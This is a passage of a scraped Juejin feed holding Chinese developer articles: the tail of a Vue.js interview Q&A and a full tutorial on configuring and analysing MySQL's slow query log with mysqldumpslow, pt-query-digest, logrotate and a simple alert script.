<p><code>beforeCreate</code> -&gt; <code>created</code> -&gt; <code>beforeMount</code> -&gt; <code>mounted</code> -&gt; <code>beforeUpdate</code> -&gt; <code>updated</code> -&gt; <code>beforeDestroy</code> -&gt; <code>destroyed</code>。</p>
</blockquote>
<h5 data-id="heading-75">1.4 数据请求在created和mouted的区别</h5>
<p><code>created</code> 是在组件实例一旦创建完成的时候立刻调用，这时候页面 <code>dom</code> 节点并未生成; <code>mounted</code>是在页面<code>dom</code>节点渲染完毕之后就立刻执行的。触发时机上<code>created</code>是比<code>mounted</code>要更早的，</p>
<p>两者的相同点:都能拿到实例对象的属性和方法。讨论这个问题本质就是触发的时机，放在<code>mounted</code>中的请求有可能导致页面闪动(因为此时页面dom结构已经生成)，但如果在页面加载前完成请求，则不会出现此情况。建议对页面内容的改动放在 created 生命周期当中。</p>
<h4 data-id="heading-76">2.双向数据绑定是什么？</h4>
<p>释义：当js代码更新Model时，view也会自动更新，用户更新view，Model的数据也会自动被更新，就是双向绑定。</p>
<h4 data-id="heading-77">3.Vue组件之间的通信方式有哪些？</h4>
<ul>
<li>1.通过props传递 （父给子组件传递）</li>
<li>2.通过$emit触发自定义事件 （子传父）</li>
<li>3.使用ref （父组件使用子组件的时候）</li>
<li>
<ol start="4">
<li>EventBus （兄弟组件传值）</li>
</ol>
</li>
<li>
<ol start="5">
<li>attrs 与 listeners （祖先传递给子孙）</li>
</ol>
</li>
<li>
<ol start="6">
<li>Provide 与 Inject （在祖先组件定义provide）返回传递的值，在后代组件通过inject 接收组件传递过来的值。</li>
</ol>
</li>
<li>
<ol start="7">
<li>Vuex （复杂关系组件数据传递，存放共享变量）</li>
</ol>
</li>
</ul>
<h4 data-id="heading-78">4.v-if和v-for的优先级是什么？</h4>
<p><code>v-for的优先级比v-if的高</code></p>
<p><strong>注意</strong></p>
<p>不能把v-if 和 v-for 同时在同一个元素上，带来性能方面的浪费。必须使用的话可以在外层套一个template</p>
<h4 data-id="heading-79">5. 未完待续。。。</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[我们来说一下 MySQL 的慢查询日志]]></title>    <link>https://juejin.cn/post/7590071125398356008</link>    <guid>https://juejin.cn/post/7590071125398356008</guid>    <pubDate>2026-01-02T08:53:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398356008" data-draft-id="7590159073988296756" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="我们来说一下 MySQL 的慢查询日志"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-02T08:53:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小假"/> <meta itemprop="url" content="https://juejin.cn/user/2285197690931932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            我们来说一下 MySQL 的慢查询日志
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2285197690931932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小假
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:53:53.000Z" title="Fri Jan 02 2026 08:53:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、什么是慢查询日志</h3>
<p><strong>慢查询日志（Slow Query Log）</strong> 是 MySQL 内置的一种日志功能，用于记录执行时间超过指定阈值的 SQL 语句。这是优化数据库性能的重要工具。</p>
<h3 data-id="heading-1">二、核心作用</h3>
<ol>
<li><strong>性能诊断</strong>：找出执行效率低的 SQL 语句</li>
<li><strong>瓶颈定位</strong>：分析查询为什么慢（全表扫描、索引缺失等）</li>
<li><strong>优化依据</strong>：为 SQL 优化和索引调整提供数据支持</li>
</ol>
<h3 data-id="heading-2">三、配置参数详解</h3>
<pre><code class="hljs language-ini" lang="ini">-- 查看所有慢查询相关参数
SHOW VARIABLES LIKE '%slow%'<span class="hljs-comment">;</span>
SHOW VARIABLES LIKE '%long_query_time%'<span class="hljs-comment">;</span>

-- 主要配置参数：
-- <span class="hljs-attr">slow_query_log</span> = <span class="hljs-literal">OFF</span>/<span class="hljs-literal">ON</span>          <span class="hljs-comment"># 是否开启慢查询日志</span>
-- <span class="hljs-attr">slow_query_log_file</span> = /path/name <span class="hljs-comment"># 日志文件路径</span>
-- <span class="hljs-attr">long_query_time</span> = <span class="hljs-number">10</span>             <span class="hljs-comment"># 阈值（秒），默认10秒</span>
-- <span class="hljs-attr">min_examined_row_limit</span> = <span class="hljs-number">0</span>       <span class="hljs-comment"># 最少检查行数阈值</span>
-- <span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-literal">OFF</span> <span class="hljs-comment"># 是否记录未使用索引的查询</span>
-- <span class="hljs-attr">log_slow_admin_statements</span> = <span class="hljs-literal">OFF</span>  <span class="hljs-comment"># 是否记录管理语句</span>
-- <span class="hljs-attr">log_output</span> = FILE/TABLE/NONE     <span class="hljs-comment"># 输出方式</span>
</code></pre>
<h3 data-id="heading-3">四、开启和配置</h3>
<h4 data-id="heading-4">1. 临时开启（重启失效）</h4>
<pre><code class="hljs language-ini" lang="ini">SET GLOBAL <span class="hljs-attr">slow_query_log</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">long_query_time</span> = <span class="hljs-number">2</span><span class="hljs-comment">;      -- 设为2秒</span>
SET GLOBAL <span class="hljs-attr">slow_query_log_file</span> = <span class="hljs-string">'/var/log/mysql/slow.log'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-5">2. 永久开启（修改配置文件）</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># my.cnf 或 my.ini</span>
<span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">slow_query_log</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">slow_query_log_file</span> = /var/log/mysql/slow.log
<span class="hljs-attr">long_query_time</span> = <span class="hljs-number">2</span>
<span class="hljs-attr">log_queries_not_using_indexes</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">log_output</span> = FILE
</code></pre>
<h3 data-id="heading-6">五、慢查询日志格式分析</h3>
<h4 data-id="heading-7">典型日志条目：</h4>
<pre><code class="hljs language-sql" lang="sql"># <span class="hljs-type">Time</span>: <span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span>T10:<span class="hljs-number">00</span>:<span class="hljs-number">00.123456</span>Z
# <span class="hljs-keyword">User</span><span class="hljs-variable">@Host</span>: root[root] @ localhost []  Id:     <span class="hljs-number">5</span>
# Query_time: <span class="hljs-number">5.123456</span>  Lock_time: <span class="hljs-number">0.001000</span>  Rows_sent: <span class="hljs-number">10</span>  Rows_examined: <span class="hljs-number">1000000</span>
<span class="hljs-keyword">SET</span> <span class="hljs-type">timestamp</span><span class="hljs-operator">=</span><span class="hljs-number">1672560000</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> last_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%smith%'</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<h4 data-id="heading-8">关键字段解释：</h4>
<ul>
<li><strong>Query_time</strong>：查询执行总时间</li>
<li><strong>Lock_time</strong>：锁定时间</li>
<li><strong>Rows_sent</strong>：返回给客户端的行数</li>
<li><strong>Rows_examined</strong>：扫描的行数</li>
<li><strong>Rows_affected</strong>：影响的行数（UPDATE/DELETE/INSERT）</li>
</ul>
<h3 data-id="heading-9">六、慢查询分析工具</h3>
<h4 data-id="heading-10">1. <strong>mysqldumpslow</strong>（MySQL 自带）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 按查询时间排序</span>
mysqldumpslow -s t /var/log/mysql/slow.log

<span class="hljs-comment"># 按锁时间排序</span>
mysqldumpslow -s l /var/log/mysql/slow.log

<span class="hljs-comment"># 按执行次数排序</span>
mysqldumpslow -s c /var/log/mysql/slow.log

<span class="hljs-comment"># 显示前10条最慢的查询</span>
mysqldumpslow -t 10 /var/log/mysql/slow.log

<span class="hljs-comment"># 分析特定用户的慢查询</span>
mysqldumpslow -a -g <span class="hljs-string">"root"</span> /var/log/mysql/slow.log
</code></pre>
<h4 data-id="heading-11">2. <strong>pt-query-digest</strong>（Percona Toolkit）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 分析慢查询日志</span>
pt-query-digest /var/log/mysql/slow.log

<span class="hljs-comment"># 分析最近12小时的慢查询</span>
pt-query-digest --since=12h /var/log/mysql/slow.log

<span class="hljs-comment"># 输出到文件</span>
pt-query-digest /var/log/mysql/slow.log &gt; slow_report.txt
</code></pre>
<h4 data-id="heading-12">3. <strong>mysqlslow</strong>（第三方工具）</h4>
<pre><code class="hljs language-c" lang="c">mysqlslow /var/<span class="hljs-built_in">log</span>/mysql/slow.<span class="hljs-built_in">log</span>
</code></pre>
<h3 data-id="heading-13">七、慢查询日志表模式</h3>
<h4 data-id="heading-14">启用表模式存储：</h4>
<pre><code class="hljs language-ini" lang="ini">SET GLOBAL <span class="hljs-attr">log_output</span> = <span class="hljs-string">'TABLE'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">slow_query_log</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>

-- 查询慢查询日志
SELECT * FROM mysql.slow_log<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-15">表结构：</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> mysql.slow_log;

<span class="hljs-comment">-- 主要字段：</span>
<span class="hljs-comment">-- start_time: 查询开始时间</span>
<span class="hljs-comment">-- query_time: 查询耗时</span>
<span class="hljs-comment">-- lock_time: 锁定时间</span>
<span class="hljs-comment">-- rows_sent: 返回行数</span>
<span class="hljs-comment">-- rows_examined: 检查行数</span>
<span class="hljs-comment">-- sql_text: SQL语句</span>
<span class="hljs-comment">-- user_host: 用户和主机信息</span>
</code></pre>
<h3 data-id="heading-16">八、最佳实践和优化建议</h3>
<h4 data-id="heading-17">1. <strong>阈值设置建议</strong></h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 生产环境建议</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;    <span class="hljs-comment">-- 2秒阈值</span>

<span class="hljs-comment">-- 开发/测试环境可以更严格</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">0.5</span>;  <span class="hljs-comment">-- 500毫秒</span>

<span class="hljs-comment">-- 微秒级精度（MySQL 5.7+）</span>
<span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> long_query_time <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span>;  <span class="hljs-comment">-- 100毫秒</span>
</code></pre>
<h4 data-id="heading-18">2. <strong>日志轮转配置</strong></h4>
<pre><code class="hljs language-lua" lang="lua"># 使用 logrotate
/var/<span class="hljs-built_in">log</span>/mysql/slow.<span class="hljs-built_in">log</span> {
    daily
    rotate <span class="hljs-number">30</span>
    missingok
    compress
    delaycompress
    notifempty
    <span class="hljs-built_in">create</span> <span class="hljs-number">640</span> mysql mysql
    postrotate
        mysqladmin <span class="hljs-built_in">flush</span>-logs
    endscript
}
</code></pre>
<h4 data-id="heading-19">3. <strong>定期分析计划</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 每日分析脚本示例</span>
<span class="hljs-comment">#!/bin/bash</span>
DATE=$(<span class="hljs-built_in">date</span> +%Y%m%d)
pt-query-digest /var/log/mysql/slow.log &gt; /var/log/mysql/slow_report_<span class="hljs-variable">${DATE}</span>.txt
<span class="hljs-comment"># 清空日志文件（先备份）</span>
<span class="hljs-built_in">cp</span> /var/log/mysql/slow.log /var/log/mysql/slow.log.<span class="hljs-variable">${DATE}</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> &gt; /var/log/mysql/slow.log
</code></pre>
<h3 data-id="heading-20">九、性能监控和告警</h3>
<h4 data-id="heading-21">1. 监控慢查询数量</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 监控每分钟的慢查询数量</span>
<span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">GLOBAL</span> STATUS <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'Slow_queries'</span>;

<span class="hljs-comment">-- 查看当前慢查询</span>
<span class="hljs-keyword">SHOW</span> PROCESSLIST;
</code></pre>
<h4 data-id="heading-22">2. 慢查询告警脚本</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
SLOW_COUNT=$(mysql -e <span class="hljs-string">"SHOW GLOBAL STATUS LIKE 'Slow_queries'"</span> | grep Slow_queries | awk <span class="hljs-string">'{print $2}'</span>)
THRESHOLD=100

<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$SLOW_COUNT</span> -gt <span class="hljs-variable">$THRESHOLD</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"警告：慢查询数量异常！当前数量: <span class="hljs-variable">$SLOW_COUNT</span>"</span> | mail -s <span class="hljs-string">"MySQL慢查询告警"</span> admin@example.com
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-23">十、注意事项</h3>
<ol>
<li><strong>性能影响</strong>：开启慢查询日志会有约1-3%的性能开销</li>
<li><strong>磁盘空间</strong>：定期清理，避免日志文件过大</li>
<li><strong>敏感信息</strong>：日志可能包含敏感数据，需妥善保管</li>
<li><strong>生产环境</strong>：建议设置合理的阈值，避免记录过多无关查询</li>
<li><strong>版本差异</strong>：MySQL 5.7+ 支持微秒级精度，之前版本只到秒</li>
</ol>
<h3 data-id="heading-24">面试回答</h3>
<p>简单来说，<strong>慢查询日志就像是 MySQL 的一个‘病历本’</strong>。它会自动记录下来所有执行时间超过某个阈值的 SQL 语句。这样我们开发或者 DBA 就能知道，哪些查询是‘慢’的、有问题的，然后去针对性地优化。</p>
<p>在实际工作中，我主要会关注和操作这么几个方面：</p>
<p><strong>第一，怎么开启和设置。</strong><br/>
慢查询日志默认是关闭的，因为它会有一点磁盘 I/O 的开销。我们需要在 MySQL 配置文件（比如 <code>my.cnf</code>）里设置几个核心参数：</p>
<ol>
<li><code>slow_query_log = ON</code>：打开开关。</li>
<li><code>slow_query_log_file</code>：指定这个‘病历本’文件存哪里。</li>
<li><code>long_query_time</code>：这是最重要的一个阈值，单位是秒。比如设为 1，就意味着执行超过 1 秒的 SQL 才会被记录。这个值可以根据系统性能要求来调整。</li>
<li><code>log_queries_not_using_indexes</code>：这个我也经常会打开。它会记录那些没有使用索引的查询，即使它执行得很快。这能帮我们发现潜在的设计问题。</li>
</ol>
<p><strong>第二，怎么看这个日志。</strong><br/>
日志是文本格式，可以直接看，但不太直观。我常用的方法是：</p>
<ol>
<li>用 MySQL 自带的 <code>mysqldumpslow</code> 工具。这个命令行工具可以对日志进行汇总、排序，比如我们可以用 <code>mysqldumpslow -t 10 -s t</code> 来找出耗时最长的前 10 条 SQL，一目了然。</li>
<li>对于更复杂的分析，我会用 <strong>Percona 公司开的</strong> ****<code>pt-query-digest</code> 工具。它功能更强大，能给出非常详细的报告，比如每个 SQL 的响应时间占比、执行次数、锁时间等，能帮我快速定位最需要优化的‘瓶颈’ SQL。</li>
</ol>
<p><strong>第三，也是最重要的，找到慢 SQL 后怎么办。</strong><br/>
光找到没用，关键是要优化。我一般的排查思路是：</p>
<ol>
<li>拿到这条慢 SQL，先<strong>用</strong> <code>explain</code> <strong>命令去看它的执行计划</strong>。这是标准动作。我会重点看：</li>
</ol>
<ul>
<li>
<ul>
<li>有没有用到索引（<code>key</code> 字段）。</li>
<li>扫描了多少行（<code>rows</code> 字段）。</li>
<li>查询类型是不是全表扫描（<code>type</code> 字段，如果是 <code>ALL</code> 就不好了）。</li>
</ul>
</li>
</ul>
<ol start="2">
<li>根据 ****<code>explain</code> ****的结果，常见的优化手段就是：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>加索引</strong>：这是最有效的办法之一，检查 <code>WHERE</code>、<code>ORDER BY</code>、<code>JOIN</code> 的字段。</li>
<li><strong>优化 SQL 本身</strong>：比如避免 <code>SELECT *</code>，检查是否有复杂的子查询能不能改写为 <code>JOIN</code>，或者分页查询在大偏移量时有没有优化空间。</li>
<li><strong>看看是不是数据库参数问题</strong>，比如缓冲池大小是不是不合理。</li>
</ul>
</li>
</ul>
<hr/>
<p><strong>最后，我的一点实践经验是</strong>：慢查询日志在测试环境和生产环境都很有用。在项目上线前，我们会开启它来提前发现一些性能问题。在生产环境，我们会长期开启，但会设置一个合理的 <code>long_query_time</code>（比如从 2 秒开始），并定期归档和分析日志，把它作为性能监控和容量规划的一个重要依据。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《独立开发者精选工具》第 025 期]]></title>    <link>https://juejin.cn/post/7590021144779800622</link>    <guid>https://juejin.cn/post/7590021144779800622</guid>    <pubDate>2026-01-02T08:54:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590021144779800622" data-draft-id="7590503651116318770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《独立开发者精选工具》第 025 期"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-02T08:54:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Immerse"/> <meta itemprop="url" content="https://juejin.cn/user/2708812817761752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《独立开发者精选工具》第 025 期
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2708812817761752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Immerse
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:54:42.000Z" title="Fri Jan 02 2026 08:54:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" 